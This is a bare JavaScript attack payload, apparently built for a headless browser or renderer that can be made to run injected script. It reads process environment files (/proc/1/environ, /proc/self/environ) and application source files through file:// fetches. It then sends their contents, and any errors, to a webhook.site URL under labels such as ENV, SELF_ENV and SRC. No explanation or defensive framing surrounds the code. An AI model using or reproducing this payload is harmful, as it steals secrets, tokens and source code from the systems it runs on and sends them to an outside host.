var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
// Focused: read environ and source
fetch('file:///proc/1/environ').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/ENV?d='+encodeURIComponent(t));
}).catch(function(e){fetch(w+'/ENV_ERR?d='+encodeURIComponent(e+''))});

fetch('file:///proc/self/environ').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/SELF_ENV?d='+encodeURIComponent(t));
}).catch(function(e){fetch(w+'/SELF_ENV_ERR?d='+encodeURIComponent(e+''))});

// Try reading the app dir for source
fetch('file:///app/index.js').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/SRC?d='+encodeURIComponent(t.substring(0,1500)));
}).catch(function(e){fetch(w+'/SRC_ERR?d='+encodeURIComponent(e+''))});

fetch('file:///index.js').then(function(r){return r.text()}).then(function(t){
  fetch(w+'/ROOT_SRC?d='+encodeURIComponent(t.substring(0,1500)));
}).catch(function(e){});
